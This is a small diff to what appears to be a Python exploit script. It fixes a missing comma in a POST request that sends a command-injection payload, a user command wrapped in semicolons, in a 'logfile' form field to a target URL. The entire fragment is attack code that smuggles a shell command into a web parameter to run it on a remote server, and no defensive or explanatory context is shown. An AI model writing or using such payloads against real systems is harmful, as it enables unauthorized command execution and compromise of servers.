@@ -27,7 +27,7 @@ else:
         command = ";"+cmd+";"
         s = requests.Session()
         post_data = {
-            "logfile": command
+            "logfile": command,
             "idk" : "fucck"
         }
         post_Request = s.post(url, data=post_data)
